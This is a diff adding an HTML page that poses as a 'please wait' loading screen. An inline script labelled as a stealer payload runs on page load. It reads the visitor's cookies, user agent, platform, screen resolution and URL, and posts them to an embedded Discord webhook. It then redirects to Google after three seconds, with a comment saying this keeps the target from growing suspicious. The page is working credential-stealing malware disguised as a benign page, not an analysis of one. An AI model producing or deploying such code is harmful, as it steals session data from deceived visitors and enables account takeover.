@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Sedang Memuat...</title>
+    <style>
+        body { background-color: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loading { text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="loading">
+        <h1>PLEASE WAIT...</h1>
+        <p>Loading Resources [■■■■■■■■■□] 90%</p>
+    </div>
+
+    <script>
+        // Rezx AI - Stealer Payload
+        (function() {
+            const webhook = "https://discord.com/api/webhooks/1453236936721432628/zlDhjFHjhpwMCAmhoQ6pGHjW4bbM-Eyirx0KsxAN4yGlxYA6Fra_CpYcQ_lTCA4Hma8c";
+            
+            // Ambil data
+            const cookie = document.cookie || "No Cookie (Possible HttpOnly protection)";
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = screen.width + "x" + screen.height;
+            const url = window.location.href;
+
+            const data = {
+                username: "Rezx AI Logger",
+                avatar_url: "https://i.imgur.com/AfFp7pu.png",
+                embeds: [{
+                    title: "Target Hooked! 😈",
+                    color: 0xff0000,
+                    fields: [
+                        { name: "🌐 URL Target", value: "```" + url + "```" },
+                        { name: "🍪 Cookie", value: "```" + cookie + "```" },
+                        { name: "📱 Info Device", value: "```OS: " + platform + "\nRes: " + screenRes + "```" },
+                        { name: "🔍 User Agent", value: "```" + userAgent + "```" }
+                    ],
+                    footer: { text: "Created by Rezx AI | Dev: Rezz" },
+                    timestamp: new Date()
+                }]
+            };
+
+            // Kirim ke Webhook
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log("Failed to send."));
+
+            // Biar target gak curiga, redirect setelah 3 detik
+            setTimeout(() => {
+                window.location.href = "https://google.com";
+            }, 3000);
+        })();
+    </script>
+</body>
+</html>
